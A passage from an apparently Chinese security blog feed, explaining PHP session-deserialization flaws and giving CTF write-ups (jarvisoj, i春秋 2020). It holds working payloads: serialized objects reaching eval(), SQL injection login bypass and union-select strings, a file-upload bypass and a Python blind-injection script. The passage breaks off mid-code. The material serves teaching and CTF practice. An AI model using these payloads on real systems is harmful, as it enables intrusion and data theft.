表明session的默认序列话引擎使用的是php序列话引擎</span><br></pre></td></tr></table></figure><p>PHP中有多种session的序列话引擎，当我设置session为<code>$_SESSION[&quot;name&quot;] = &quot;V0W&quot;;</code>时。不同的引擎保存的session文件内容如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php: </span><br><span class="line">    name|s:3:&quot;V0W&quot;;</span><br><span class="line">    存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br><span class="line"></span><br><span class="line">php_binary:</span><br><span class="line">    names:3:&quot;V0W&quot;;</span><br><span class="line">    存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;5.5.4):</span><br><span class="line">    a:1:&#123;s:4:&quot;name&quot;;s:3:&quot;V0W&quot;;&#125;</span><br><span class="line">    存储方式是，经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure><p>切换不同引擎使用的函数：</p><p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;调用引擎&#39;);</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;V0W&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>另外文件名，其实是<code>PHPSESSIONID</code>的值</p><p><img src="https://i.loli.net/2020/03/11/Q4isJOLn6tG2euE.png"></p><h3 id="3-2-PHP的Session反序列化漏洞原理"><a href="#3-2-PHP的Session反序列化漏洞原理" class="headerlink" title="3.2 PHP的Session反序列化漏洞原理"></a>3.2 PHP的Session反序列化漏洞原理</h3><p>如果在PHP在反序列化存储的<code>$_SESSION</code>数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确地反序列化。如果session值可控，则可通过构造特殊的session值导致反序列化漏洞。</p><p>用原文的一个例子：</p><p><code>session.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&quot;spoock&quot;</span>]=$_GET[<span class="string">&quot;a&quot;</span>];</span><br></pre></td></tr></table></figure><p><code>session2.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $hi;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hi = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>session.php中的Session是可控的，但是反序列的魔术方法在session2.php中，而session中的参数无法直接可控。</p><p>这个时候，就可以利用两个的php的session存储机制的不同实现session的反序列化攻击。</p><p>具体说：</p><ol><li><p>将payload用session.php，控制存储在指定文件中。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.php?a&#x3D;|O:5:&quot;lemon&quot;:1:&#123;s:2:&quot;hi&quot;;s:14:&quot;echo &quot;spoock&quot;;&quot;;&#125;</span><br></pre></td></tr></table></figure><p>此时传入的数据会按照<strong>php_serialize</strong>来进行序列化，并存储到文件中。</p></li><li><p>再访问session2.php，页面输出<code>spoock</code>,成功执行我们构造的函数。因为在访问session2.php时，程序会按照<strong>php</strong>来反序列化SESSION中的数据（因为同域<code>PHPSESSIONID</code>是一样的，之前存的session也适用），此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。</p></li><li><p>可以单步调试一下，更容易理解这两个过程。</p><p><img src="https://i.loli.net/2020/03/11/G4Uh2sDx3grIHL9.png"></p><p><img src="https://i.loli.net/2020/03/11/eUb4csuApvX931V.png"></p></li></ol><h3 id="3-3-更进一步的Session反序列化利用"><a href="#3-3-更进一步的Session反序列化利用" class="headerlink" title="3.3 更进一步的Session反序列化利用"></a>3.3 更进一步的Session反序列化利用</h3><p>上述的利用达到了攻击目的，但是，局限性比较大，我们看一下条件：</p><ol><li>两个文件session引擎配置不同</li><li>其中一个session可控</li><li>两个文件同域</li></ol><p>如何更进一步的利用，或者较少限制的利用Session反序列化呢？</p><p>在<a href="http://www.91ri.org/15925.html">有趣的php反序列化总结</a>中介绍了另一种Session反序列化漏洞的利用方式。</p><p>当PHP中<code>session.upload_progress.enabled</code>打开时，php会记录上传文件的进度，在上传时会将其信息保存在<code>$_SESSION</code>中。<a href="https://bugs.php.net/bug.php?id=71101">phpbugs详情</a>（还有老外的讨论也可以看一下）</p><p>看一下这个漏洞（我为其命名：上传程序Session漏洞）出现的条件：</p><ol><li><code>session.upload_progress.enabled = On</code> (是否启用上传进度报告)</li><li><code>session.upload_progress.cleanup = Off</code> (是否上传完成之后删除session文件)</li></ol><p>符合条件时，上传文件进度的报告就会以写入到session文件中，所以我们可以设置一个与<code>session.upload_progress.name</code>同名的变量(默认名为<code>PHP_SESSION_UPLOAD_PROGRESS</code>)，PHP检测到这种同名请求会在<code>$_SESSION</code>中添加一条数据。我们就可以控制这个数据内容为我们的恶意payload。</p><h3 id="3-4-实例"><a href="#3-4-实例" class="headerlink" title="3.4 实例"></a>3.4 实例</h3><p>用jarvisoj上一个题目作为实例，<a href="http://web.jarvisoj.com:32784/">题目链接</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>容易发现，<code>OowoO.__destruct()</code>存在代码执行，但是没有可控参数进行利用。</p><p>然后发现符合上传程序Session漏洞的条件：</p><p><img src="https://i.loli.net/2020/03/11/gwD8aRGh4ZBYAxm.png"></p><p>接下来就是如何利用的问题了，我们知道这个漏洞出在上传时的Session存储问题上，所以我们可以利用上传来写入。</p><p>先自己写一个简单的上传页面upload.html：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> method=<span class="string">&quot;POST&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> value=<span class="string">&quot;&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>poc.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line">$a-&gt;mdzz = <span class="string">&quot;print_r(scandir(__dir__));&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意到phpinfo中，禁用了<code>exec,system</code>等函数，注意用<code>print_r</code>绕过。</p><p><img src="https://i.loli.net/2020/03/11/WKjrgSeayOTEUxl.png"></p><p>再从phpinfo中的<code>SCRIPT_FILENAME</code>字段得到根目录地址：<code>/opt/lampp/htdocs/</code>,构造得到payload：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&#39;&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;Here_1s_7he_fl4g_buT_You_Cannot_see.php&#39;));&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/11/UnyYaeblrs3HDqQ.png"></p><h2 id="0x04-反序列化的防御"><a href="#0x04-反序列化的防御" class="headerlink" title="0x04 反序列化的防御"></a>0x04 反序列化的防御</h2><p>因为反序列化的缺陷可能导致远程代码执行等严重的攻击，所以我们需要对其进行防护：</p><ol><li>对传入 <code>unserilize()</code> 的参数，进行严格地过滤。</li><li>在文件系统函数的参数可控时，进行严格地过滤。</li><li>严格检查上传文件内容，不能只是单纯地检查文件头（phar）</li><li>条件允许的情况下，禁用可执行系统命令、代码的危险函数。</li><li>注意不同类中的同名方法的编写，避免被用作反序列化的跳板。</li><li>Session方面，一个是多文件间使用一种序列化引擎；二是尽量不要让session可控；三是保持<code>session.upload_progress.cleanup = On</code> (上传完成之后删除session文件)</li></ol><h2 id="0xff-参考链接"><a href="#0xff-参考链接" class="headerlink" title="0xff 参考链接"></a>0xff 参考链接</h2><ol><li><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你深入理解漏洞之 PHP 反序列化漏洞</a> 2018,11 k0rn3n</li><li><a href="https://xz.aliyun.com/t/6454">PHP反序列化进阶学习与总结</a>, Threezh1, 先知社区</li><li><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">PHP中SESSION反序列化机制</a>, Spoock</li><li><a href="http://www.91ri.org/15925.html">有趣的php反序列化总结</a></li><li><a href="http://llfam.cn/2019/04/01/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95">php反序列化</a> 2019,04 llfam</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;php反序列化与POP链&quot;&gt;&lt;a href=&quot;#php反序列化与POP链&quot; class=&quot;headerlink&quot; title=&quot;php反序列化与POP链&quot;&gt;&lt;/a&gt;php反序列化与POP链&lt;/h1&gt;&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前</summary>
      
    
    
    
    <category term="Web安全" scheme="v0w.top/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="v0w.top/tags/php/"/>
    
    <category term="反序列化" scheme="v0w.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>i春秋2020 新春公益赛</title>
    <link href="v0w.top/2020/02/26/ichunqiu2020gys/"/>
    <id>v0w.top/2020/02/26/ichunqiu2020gys/</id>
    <published>2020-02-25T16:00:00.000Z</published>
    <updated>2020-07-18T10:28:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="简单的招聘系统"><a href="#简单的招聘系统" class="headerlink" title="简单的招聘系统"></a>简单的招聘系统</h3><p>万用密码登录<code>admin</code>用户</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1#</span><br><span class="line">123qwe</span><br></pre></td></tr></table></figure><p>在<code>blank-page</code>中的<code>search for key</code>处存在SQL注入，联合查询就可以了</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pages-blank.php?key&#x3D;1&#39; or 1&#x3D;1 order by 5%23</span><br><span class="line">判断存在5个字段</span><br><span class="line"></span><br><span class="line">pages-blank.php?key&#x3D;1&#39; union select 1,2,3,4,5%23</span><br><span class="line">回显在2处</span><br><span class="line"></span><br><span class="line">&#x2F;pages-blank.php?key&#x3D;1&#39; union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema&#x3D;database()%23</span><br><span class="line">表名：backup, flag, user</span><br><span class="line"></span><br><span class="line">pages-blank.php?key&#x3D;1&#39; union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;flag&#39;%23</span><br><span class="line">列名：id, flaaag</span><br><span class="line"></span><br><span class="line">pages-blank.php?key&#x3D;1&#39; union select 1,flaaag,3,4,5 from flag%23</span><br><span class="line">flag&#123;7e67c965-96e3-4cf4-b3f5-2cdea749bb7d&#125;</span><br></pre></td></tr></table></figure><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>无过滤，直接上传一句话，执行命令即可。白给？</p><p>下载下来研究一下怎么写的:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($ext, [<span class="string">&#x27;php,htaccess,ini,&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;upload failed&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数组写错了，原意大概是<code>if (in_array($ext, [&#39;php&#39;,&#39;htaccess&#39;,&#39;ini&#39;]))</code>然后需要利用<code>phtml</code>绕过。</p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>打开题目得到源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment"># flag在fl4g里</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;waf.php&#x27;</span>;</span><br><span class="line">    header(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>); </span><br><span class="line">    $db = <span class="keyword">new</span> mysql();</span><br><span class="line"></span><br><span class="line">    $id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($id) &#123;</span><br><span class="line">        <span class="keyword">if</span>(check_sql($id))&#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql = <span class="string">&quot;select * from flllllllag where id=$id&quot;</span>;</span><br><span class="line">            $db-&gt;query($sql);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>虽然并不知道waf.php的过滤规则，但是很好fuzz，只要被匹配了就会<code>exit()</code>，fuzz发现<code>union</code> <code>select</code> <code>&#39;</code> <code>=</code>等常用关键字被ban了。没有等号可以使用基于<code>regexp</code>的时间盲注，该payload可成功延时:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1 or if((substr((fl4g),1,1) regexp &quot;^f&quot;), sleep(5),1)</span><br></pre></td></tr></table></figure><p>所以就写脚本跑就行了：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a4cbee3d20b542baaedefc971c0798dc808fea8f0de04dd9.changame.ichunqiu.com/?id=-1&quot;</span></span><br><span class="line">words = string.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(words) </span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;fl4g&#x27;</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> words:</span><br><span class="line"><span class="comment"># 设置payload</span></span><br><span class="line">payload =<span class="string">&#x27; or if((substr((&#123;&#125;),&#123;&#125;,1) regexp &quot;^&#123;&#125;&quot;),sleep(5),1)&#x27;</span>.format(target, i, char)</span><br><span class="line"><span class="comment"># 计算响应时长</span></span><br><span class="line">start = int(time.time())</span><br><span class="line">r = requests.get(url+quote(payload))</span><br><span class="line">response_time = int(time.time()) - start</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> response_time &gt;= <span class="number">4</span>:</span><br><span class="line">result += char</span><br><span class="line">print(<span class="string">&#x27;flag: &#123;&#125;&#x27;</span>.format(result))</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这道题，一开始没做出来，以为是文件包含，然后死活弄不出来。看了<code>P3rh4ps</code>师傅的<a href="http://p3rh4ps.top/index.php/2020/02/21/820-2-21-i%e6%98%a5%e7%a7%8b%e5%85%ac%e7%9b%8a%e8%b5%9b%e5%87%ba%e9%a2%98%e7%ac%94%e8%ae%b0/">出题笔记</a>，发现思路错了，勉强复现出来。。。大佬牛逼，学到了0rz</p><p>本题主要涉及<strong>php反序列化</strong>和<strong>字符逃逸</strong>，以及<strong>POP链的构造</strong>，关于字符逃逸，我之前也没注意过，找了一篇文章，理解了一下原理——<a href="https://xz.aliyun.com/t/6718">详解PHP反序列化中的字符逃逸</a></p><p>扫描发现<code>www.zip</code>，下载审计。</p><p><code>login.php</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once(&#39;lib.php&#39;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line">&lt;title&gt;login&lt;&#x2F;title&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;login.php&quot; method&#x3D;&quot;post&quot; style&#x3D;&quot;margin-top: 300&quot;&gt;</span><br><span class="line">&lt;h2&gt;百万前端的用户信息管理系统&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;h3&gt;半成品系统 留后门的程序员已经跑路&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; placeholder&#x3D;&quot;UserName&quot; required&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;password&quot; style&#x3D;&quot;margin-top: 20&quot; name&#x3D;&quot;password&quot; placeholder&#x3D;&quot;password&quot; required&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;button style&#x3D;&quot;margin-top:20;&quot; type&#x3D;&quot;submit&quot;&gt;登录&lt;&#x2F;button&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;img src&#x3D;&#39;img&#x2F;1.jpg&#39;&gt;大家记得做好防护&lt;&#x2F;img&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">$user&#x3D;new user();</span><br><span class="line">if(isset($_POST[&#39;username&#39;]))&#123;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;username&#39;]))&#123;</span><br><span class="line">die(&quot;&lt;br&gt;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(preg_match(&quot;&#x2F;union|select|drop|delete|insert|\#|\%|\&#96;|\@|\\\\&#x2F;i&quot;, $_POST[&#39;password&#39;]))&#123;</span><br><span class="line">die(&quot;Damn you, hacker!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">$user-&gt;login();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;</span><br></pre></td></tr></table></figure><p><code>update.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;meta charset=&quot;utf-8&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;update&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h2&gt;这是一个未完成的页面，上线时建议删除本页面&lt;/h2&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> ($_SESSION[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;lib.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">require_once</span>(<span class="keyword">__DIR__</span>.<span class="string">&quot;/&quot;</span>.$_GET[<span class="string">&#x27;action&#x27;</span>].<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>]==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=update&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php?action=login&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>lib.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe</span>(<span class="params">$parm</span>)</span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;regexp&#x27;</span>,<span class="string">&#x27;load&#x27;</span>,<span class="string">&#x27;into&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;insert&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;alter&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">&#x27;hacker&#x27;</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;username&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">&#x27;select id,password from user where username=?&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">$this</span>-&gt;id;  </span><br><span class="line">        $_SESSION[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你的ID是&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你好！&quot;</span>.$_SESSION[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./update.php&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">&#x27;id&#x27;</span>],$Info,<span class="string">&quot;update user SET age=$age,nickname=$nickname where id=&quot;</span>.$_SESSION[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">&#x27;age&#x27;</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;0-0&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> 